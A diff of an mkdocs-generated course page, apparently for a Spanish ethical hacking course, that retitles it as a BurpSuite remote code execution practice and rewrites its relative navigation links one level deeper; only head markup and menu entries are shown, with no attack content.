@@ -9,25 +9,25 @@
       
       
       
-        <link rel="prev" href="../04.-B%C3%BAsqueda%20de%20vulnerabilidades%20habituales%20en%20aplicaciones%20web/09.-Vulnerabilidades%20de%20la%20l%C3%B3gica%20de%20negocio/">
+        <link rel="prev" href="../Pr%C3%A1ctica%2002.-Cross%20Site%20Scripting%20Almacenado%20con%20BurpSuite/">
       
       
-        <link rel="next" href="Contexto/">
+        <link rel="next" href="../Pr%C3%A1ctica%2004.-Ejecuci%C3%B3n%20de%20inyecci%C3%B3n%20SQL%20con%20BurpSuite/">
       
       
-      <link rel="icon" href="../../assets/images/favicon.png">
+      <link rel="icon" href="../../../assets/images/favicon.png">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.44">
     
     
       
-        <title>Práctica - Hacking Ético</title>
+        <title>Práctica 03.-Ejecución remota de código con BurpSuite - Hacking Ético</title>
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.0253249f.min.css">
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.0253249f.min.css">
       
         
-        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
       
       
 
@@ -46,7 +46,7 @@
       
     
     
-    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -72,7 +72,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#practica" class="md-skip">
+        <a href="#1-requisitos-previos" class="md-skip">
           Saltar a contenido
         </a>
       
@@ -86,7 +86,7 @@
 
 <header class="md-header" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Cabecera">
-    <a href="../.." title="Hacking Ético" class="md-header__button md-logo" aria-label="Hacking Ético" data-md-component="logo">
+    <a href="../../.." title="Hacking Ético" class="md-header__button md-logo" aria-label="Hacking Ético" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -106,7 +106,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Práctica
+              Práctica 03.-Ejecución remota de código con BurpSuite
             
           </span>
         </div>
@@ -201,7 +201,7 @@
   
   
     <li class="md-tabs__item">
-      <a href="../.." class="md-tabs__link">
+      <a href="../../.." class="md-tabs__link">
         
   
     
@@ -220,7 +220,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../00.-KVM/" class="md-tabs__link">
+        <a href="../../../00.-KVM/" class="md-tabs__link">
           
   
     
@@ -240,7 +240,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/" class="md-tabs__link">
+        <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/" class="md-tabs__link">
           
   
     
@@ -260,7 +260,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/" class="md-tabs__link">
+        <a href="../../../02.-HE%20en%20entornos%20inal%C3%A1mbricos/" class="md-tabs__link">
           
   
     
@@ -280,7 +280,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/" class="md-tabs__link">
+        <a href="../../../03.-Ataque%20y%20defensa%20en%20entorno%20de%20pruebas/" class="md-tabs__link">
           
   
     
@@ -300,7 +300,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/" class="md-tabs__link">
+        <a href="../../../04.-Consolidaci%C3%B3n%20y%20utilizaci%C3%B3n%20de%20sistemas%20comprometidos/" class="md-tabs__link">
           
   
     
@@ -322,7 +322,7 @@
     
     
       <li class="md-tabs__item md-tabs__item--active">
-        <a href="../" class="md-tabs__link">
+        <a href="../../" class="md-tabs__link">
           
   
     
@@ -342,7 +342,7 @@
     
     
       <li class="md-tabs__item">
-        <a href="../../99.-Anexos/" class="md-tabs__link">
+        <a href="../../../99.-Anexos/" class="md-tabs__link">
           
   
     
@@ -377,7 +377,7 @@
 
 <nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navegación" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../.." title="Hacking Ético" class="md-nav__button md-logo" aria-label="Hacking Ético" data-md-component="logo">
+    <a href="../../.." title="Hacking Ético" class="md-nav__button md-logo" aria-label="Hacking Ético" data-md-component="logo">
       
   
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
@@ -395,7 +395,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../.." class="md-nav__link">
+      <a href="../../.." class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -456,7 +456,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../00.-KVM/" class="md-nav__link ">
+            <a href="../../../00.-KVM/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -539,7 +539,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/01.-Introducci%C3%B3n/01.-Qu%C3%A9%20es%20la%20virtualizaci%C3%B3n/" class="md-nav__link">
+      <a href="../../../00.-KVM/01.-Introducci%C3%B3n/01.-Qu%C3%A9%20es%20la%20virtualizaci%C3%B3n/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -560,7 +560,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/01.-Introducci%C3%B3n/02.-Tipos/" class="md-nav__link">
+      <a href="../../../00.-KVM/01.-Introducci%C3%B3n/02.-Tipos/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -581,7 +581,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/01.-Introducci%C3%B3n/03.-qemu-kvm/" class="md-nav__link">
+      <a href="../../../00.-KVM/01.-Introducci%C3%B3n/03.-qemu-kvm/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -602,7 +602,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/01.-Introducci%C3%B3n/04.-libvirt/" class="md-nav__link">
+      <a href="../../../00.-KVM/01.-Introducci%C3%B3n/04.-libvirt/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -623,7 +623,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/01.-Introducci%C3%B3n/05.-LXC/" class="md-nav__link">
+      <a href="../../../00.-KVM/01.-Introducci%C3%B3n/05.-LXC/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -702,7 +702,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/02.-Instalaci%C3%B3n/01.-Escenario%20de%20instalaci%C3%B3n/" class="md-nav__link">
+      <a href="../../../00.-KVM/02.-Instalaci%C3%B3n/01.-Escenario%20de%20instalaci%C3%B3n/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -723,7 +723,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/02.-Instalaci%C3%B3n/02.-Instalacion/" class="md-nav__link">
+      <a href="../../../00.-KVM/02.-Instalaci%C3%B3n/02.-Instalacion/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -744,7 +744,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/02.-Instalaci%C3%B3n/03.-Conexi%C3%B3n%20local%20no%20privilegiada%20a%20libvirt/" class="md-nav__link">
+      <a href="../../../00.-KVM/02.-Instalaci%C3%B3n/03.-Conexi%C3%B3n%20local%20no%20privilegiada%20a%20libvirt/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -765,7 +765,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/02.-Instalaci%C3%B3n/04.-Conexi%C3%B3n%20local%20privilegiada%20a%20libvirt/" class="md-nav__link">
+      <a href="../../../00.-KVM/02.-Instalaci%C3%B3n/04.-Conexi%C3%B3n%20local%20privilegiada%20a%20libvirt/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -786,7 +786,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/02.-Instalaci%C3%B3n/05.-Conexi%C3%B3n%20remota%20a%20libvirt/" class="md-nav__link">
+      <a href="../../../00.-KVM/02.-Instalaci%C3%B3n/05.-Conexi%C3%B3n%20remota%20a%20libvirt/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -865,7 +865,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/03.-Creaci%C3%B3n%20de%20MV%20desde%20el%20CLI/01.-Creaci%C3%B3n%20de%20MV%20con%20virt-install/" class="md-nav__link">
+      <a href="../../../00.-KVM/03.-Creaci%C3%B3n%20de%20MV%20desde%20el%20CLI/01.-Creaci%C3%B3n%20de%20MV%20con%20virt-install/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -886,7 +886,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/03.-Creaci%C3%B3n%20de%20MV%20desde%20el%20CLI/02.-Caracter%C3%ADsticas%20de%20la%20MV/" class="md-nav__link">
+      <a href="../../../00.-KVM/03.-Creaci%C3%B3n%20de%20MV%20desde%20el%20CLI/02.-Caracter%C3%ADsticas%20de%20la%20MV/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -907,7 +907,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/03.-Creaci%C3%B3n%20de%20MV%20desde%20el%20CLI/03.-Gesti%C3%B3n%20de%20MV%20con%20virsh/" class="md-nav__link">
+      <a href="../../../00.-KVM/03.-Creaci%C3%B3n%20de%20MV%20desde%20el%20CLI/03.-Gesti%C3%B3n%20de%20MV%20con%20virsh/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -928,7 +928,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/03.-Creaci%C3%B3n%20de%20MV%20desde%20el%20CLI/04.-Definici%C3%B3n%20XML%20de%20una%20MV/" class="md-nav__link">
+      <a href="../../../00.-KVM/03.-Creaci%C3%B3n%20de%20MV%20desde%20el%20CLI/04.-Definici%C3%B3n%20XML%20de%20una%20MV/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -949,7 +949,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/03.-Creaci%C3%B3n%20de%20MV%20desde%20el%20CLI/05.-Modificaci%C3%B3n%20de%20una%20MV/" class="md-nav__link">
+      <a href="../../../00.-KVM/03.-Creaci%C3%B3n%20de%20MV%20desde%20el%20CLI/05.-Modificaci%C3%B3n%20de%20una%20MV/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1028,7 +1028,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/04.-Creaci%C3%B3n%20de%20MV%20con%20virt-manager/01.-Primeros%20pasos%20con%20virt-manager/" class="md-nav__link">
+      <a href="../../../00.-KVM/04.-Creaci%C3%B3n%20de%20MV%20con%20virt-manager/01.-Primeros%20pasos%20con%20virt-manager/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1049,7 +1049,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/04.-Creaci%C3%B3n%20de%20MV%20con%20virt-manager/02.-Creaci%C3%B3n%20de%20MV%20linux/" class="md-nav__link">
+      <a href="../../../00.-KVM/04.-Creaci%C3%B3n%20de%20MV%20con%20virt-manager/02.-Creaci%C3%B3n%20de%20MV%20linux/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1070,7 +1070,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/04.-Creaci%C3%B3n%20de%20MV%20con%20virt-manager/03.-Gesti%C3%B3n%20de%20MV/" class="md-nav__link">
+      <a href="../../../00.-KVM/04.-Creaci%C3%B3n%20de%20MV%20con%20virt-manager/03.-Gesti%C3%B3n%20de%20MV/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1091,7 +1091,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/04.-Creaci%C3%B3n%20de%20MV%20con%20virt-manager/04.-Detalles%20de%20las%20MV/" class="md-nav__link">
+      <a href="../../../00.-KVM/04.-Creaci%C3%B3n%20de%20MV%20con%20virt-manager/04.-Detalles%20de%20las%20MV/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1112,7 +1112,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/04.-Creaci%C3%B3n%20de%20MV%20con%20virt-manager/05.-Creaci%C3%B3n%20de%20MV%20Wndows/" class="md-nav__link">
+      <a href="../../../00.-KVM/04.-Creaci%C3%B3n%20de%20MV%20con%20virt-manager/05.-Creaci%C3%B3n%20de%20MV%20Wndows/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1195,7 +1195,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/05.-Almacenamiento/01.-Introducci%C3%B3n%20al%20almacenamiento/" class="md-nav__link">
+      <a href="../../../00.-KVM/05.-Almacenamiento/01.-Introducci%C3%B3n%20al%20almacenamiento/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1216,7 +1216,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/05.-Almacenamiento/02.-Introducci%C3%B3n%20al%20almacenamiento%20en%20QEMU%E2%81%84KVM%20%2B%20libvirt/" class="md-nav__link">
+      <a href="../../../00.-KVM/05.-Almacenamiento/02.-Introducci%C3%B3n%20al%20almacenamiento%20en%20QEMU%E2%81%84KVM%20%2B%20libvirt/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1237,7 +1237,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/05.-Almacenamiento/03.-Gesti%C3%B3n%20de%20Pools%20de%20Almacenamiento/" class="md-nav__link">
+      <a href="../../../00.-KVM/05.-Almacenamiento/03.-Gesti%C3%B3n%20de%20Pools%20de%20Almacenamiento/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1258,7 +1258,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/05.-Almacenamiento/04.-Gesti%C3%B3n%20de%20vol%C3%BAmenes%20de%20almacenamiento%20con%20libvirt/" class="md-nav__link">
+      <a href="../../../00.-KVM/05.-Almacenamiento/04.-Gesti%C3%B3n%20de%20vol%C3%BAmenes%20de%20almacenamiento%20con%20libvirt/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1279,7 +1279,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/05.-Almacenamiento/05.-Gesti%C3%B3n%20de%20vol%C3%BAmenes%20de%20almacenamiento%20con%20herramientas%20espec%C3%ADficas/" class="md-nav__link">
+      <a href="../../../00.-KVM/05.-Almacenamiento/05.-Gesti%C3%B3n%20de%20vol%C3%BAmenes%20de%20almacenamiento%20con%20herramientas%20espec%C3%ADficas/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1300,7 +1300,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/05.-Almacenamiento/06.-Trabajar%20con%20vol%C3%BAmenes%20en%20las%20m%C3%A1quinas%20virtuales/" class="md-nav__link">
+      <a href="../../../00.-KVM/05.-Almacenamiento/06.-Trabajar%20con%20vol%C3%BAmenes%20en%20las%20m%C3%A1quinas%20virtuales/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1321,7 +1321,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/05.-Almacenamiento/07.-Compresi%C3%B3n%20de%20im%C3%A1genes/" class="md-nav__link">
+      <a href="../../../00.-KVM/05.-Almacenamiento/07.-Compresi%C3%B3n%20de%20im%C3%A1genes/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1381,7 +1381,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../00.-KVM/06.-Clonaci%C3%B3n%20y%20Snapshots/" class="md-nav__link ">
+            <a href="../../../00.-KVM/06.-Clonaci%C3%B3n%20y%20Snapshots/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -1414,7 +1414,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/06.-Clonaci%C3%B3n%20y%20Snapshots/01.-Clonaci%C3%B3n%20de%20m%C3%A1quinas%20virtuales/" class="md-nav__link">
+      <a href="../../../00.-KVM/06.-Clonaci%C3%B3n%20y%20Snapshots/01.-Clonaci%C3%B3n%20de%20m%C3%A1quinas%20virtuales/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1435,7 +1435,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/06.-Clonaci%C3%B3n%20y%20Snapshots/02.-Plantillas%20de%20MV/" class="md-nav__link">
+      <a href="../../../00.-KVM/06.-Clonaci%C3%B3n%20y%20Snapshots/02.-Plantillas%20de%20MV/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1456,7 +1456,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/06.-Clonaci%C3%B3n%20y%20Snapshots/03.-Clonaci%C3%B3n%20completa%20con%20plantillas/" class="md-nav__link">
+      <a href="../../../00.-KVM/06.-Clonaci%C3%B3n%20y%20Snapshots/03.-Clonaci%C3%B3n%20completa%20con%20plantillas/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1477,7 +1477,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/06.-Clonaci%C3%B3n%20y%20Snapshots/04.-Clonaci%C3%B3n%20enlazada%20con%20plantillas/" class="md-nav__link">
+      <a href="../../../00.-KVM/06.-Clonaci%C3%B3n%20y%20Snapshots/04.-Clonaci%C3%B3n%20enlazada%20con%20plantillas/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1498,7 +1498,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/06.-Clonaci%C3%B3n%20y%20Snapshots/05.-Snapshots%20de%20MV/" class="md-nav__link">
+      <a href="../../../00.-KVM/06.-Clonaci%C3%B3n%20y%20Snapshots/05.-Snapshots%20de%20MV/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1579,7 +1579,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/07.-Redes/01.-Introduccion/" class="md-nav__link">
+      <a href="../../../00.-KVM/07.-Redes/01.-Introduccion/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1600,7 +1600,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/07.-Redes/02.-Definic%C3%B3n%20de%20RV%20%28Privadas%29/" class="md-nav__link">
+      <a href="../../../00.-KVM/07.-Redes/02.-Definic%C3%B3n%20de%20RV%20%28Privadas%29/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1621,7 +1621,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/07.-Redes/03.-Gesti%C3%B3n%20de%20RV/" class="md-nav__link">
+      <a href="../../../00.-KVM/07.-Redes/03.-Gesti%C3%B3n%20de%20RV/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1642,7 +1642,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/07.-Redes/04.-Creaci%C3%B3n%20de%20un%20Puerte%20Externo%20con%20Linux%20Bridge/" class="md-nav__link">
+      <a href="../../../00.-KVM/07.-Redes/04.-Creaci%C3%B3n%20de%20un%20Puerte%20Externo%20con%20Linux%20Bridge/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1663,7 +1663,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/07.-Redes/05.-Gesti%C3%B3n%20de%20Redes%20Puentes%20%28P%C3%BAblicas%29/" class="md-nav__link">
+      <a href="../../../00.-KVM/07.-Redes/05.-Gesti%C3%B3n%20de%20Redes%20Puentes%20%28P%C3%BAblicas%29/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1684,7 +1684,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/07.-Redes/06.-Configuraci%C3%B3n%20de%20red%20en%20MV/" class="md-nav__link">
+      <a href="../../../00.-KVM/07.-Redes/06.-Configuraci%C3%B3n%20de%20red%20en%20MV/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1765,7 +1765,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/08.-LXC/01.-Introduccion%20a%20LXC/" class="md-nav__link">
+      <a href="../../../00.-KVM/08.-LXC/01.-Introduccion%20a%20LXC/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1786,7 +1786,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/08.-LXC/02.-Creaci%C3%B3n%20y%20gesti%C3%B3n%20de%20contenedores/" class="md-nav__link">
+      <a href="../../../00.-KVM/08.-LXC/02.-Creaci%C3%B3n%20y%20gesti%C3%B3n%20de%20contenedores/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1807,7 +1807,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/08.-LXC/03.-Configuraci%C3%B3n%20de%20contenedores%20LXC/" class="md-nav__link">
+      <a href="../../../00.-KVM/08.-LXC/03.-Configuraci%C3%B3n%20de%20contenedores%20LXC/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1828,7 +1828,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/08.-LXC/04.-Redes%20en%20LXC/" class="md-nav__link">
+      <a href="../../../00.-KVM/08.-LXC/04.-Redes%20en%20LXC/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1849,7 +1849,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/08.-LXC/05.-Almacenamiento%20en%20LXC/" class="md-nav__link">
+      <a href="../../../00.-KVM/08.-LXC/05.-Almacenamiento%20en%20LXC/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1870,7 +1870,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/08.-LXC/06.-Introducci%C3%B3n%20a%20LXD/" class="md-nav__link">
+      <a href="../../../00.-KVM/08.-LXC/06.-Introducci%C3%B3n%20a%20LXD/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1943,7 +1943,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/09.-Anexos/01.-Uso%20de%20los%20puertos%20USB%20en%20KVM/" class="md-nav__link">
+      <a href="../../../00.-KVM/09.-Anexos/01.-Uso%20de%20los%20puertos%20USB%20en%20KVM/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -1964,7 +1964,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/09.-Anexos/02.-Copiar%20y%20Pegar/" class="md-nav__link">
+      <a href="../../../00.-KVM/09.-Anexos/02.-Copiar%20y%20Pegar/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2018,7 +2018,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../00.-KVM/10.-Pr%C3%A1cticas/" class="md-nav__link ">
+            <a href="../../../00.-KVM/10.-Pr%C3%A1cticas/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -2051,7 +2051,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/10.-Pr%C3%A1cticas/01.-Instrucciones%20para%20la%20captura/" class="md-nav__link">
+      <a href="../../../00.-KVM/10.-Pr%C3%A1cticas/01.-Instrucciones%20para%20la%20captura/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2072,7 +2072,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../00.-KVM/10.-Pr%C3%A1cticas/02.-Solucionario/" class="md-nav__link">
+      <a href="../../../00.-KVM/10.-Pr%C3%A1cticas/02.-Solucionario/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2145,7 +2145,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/" class="md-nav__link ">
+            <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -2178,7 +2178,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/01.-Historia%20del%20hacking/" class="md-nav__link">
+      <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/01.-Historia%20del%20hacking/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2199,7 +2199,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/02.-Conceptos%20b%C3%A1sicos%20de%20la%20seguridad%20de%20la%20informaci%C3%B3n/" class="md-nav__link">
+      <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/02.-Conceptos%20b%C3%A1sicos%20de%20la%20seguridad%20de%20la%20informaci%C3%B3n/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2220,7 +2220,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/03.-Amenazas%20a%20la%20seguridad%20de%20la%20informaci%C3%B3n/" class="md-nav__link">
+      <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/03.-Amenazas%20a%20la%20seguridad%20de%20la%20informaci%C3%B3n/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2241,7 +2241,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/04.-Test%20de%20intrusi%C3%B3n%20%28Pentest%29/" class="md-nav__link">
+      <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/04.-Test%20de%20intrusi%C3%B3n%20%28Pentest%29/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2262,7 +2262,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/05.-C%C3%B3mo%20convertirse%20en%20Hacker%20%28from%20zero%20to%20hero%29/" class="md-nav__link">
+      <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/05.-C%C3%B3mo%20convertirse%20en%20Hacker%20%28from%20zero%20to%20hero%29/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2283,7 +2283,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/06.-Links%20de%20inter%C3%A9s/" class="md-nav__link">
+      <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/06.-Links%20de%20inter%C3%A9s/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2337,7 +2337,7 @@
           
           
           <div class="md-nav__link md-nav__container">
-            <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/07.-Laboratorio%20de%20pr%C3%A1cticas/" class="md-nav__link ">
+            <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/07.-Laboratorio%20de%20pr%C3%A1cticas/" class="md-nav__link ">
               
   
   <span class="md-ellipsis">
@@ -2370,7 +2370,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/07.-Laboratorio%20de%20pr%C3%A1cticas/01.-Retos%20de%20la%20plataforma%20Atenea/" class="md-nav__link">
+      <a href="../../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/07.-Laboratorio%20de%20pr%C3%A1cticas/01.-Retos%20de%20la%20plataforma%20Atenea/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -2391,7 +2391,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../01.-Introducci%C3%B3n%20al%20Hacking%20%C3%89tico/07.-Laboratorio%20de%20pr%C3%A1cticas/02.-Mi%20primera%20m%C3%A1quina%20vulnerable%20%28boot2root%29%20DC-1/" class="md-nav__link">
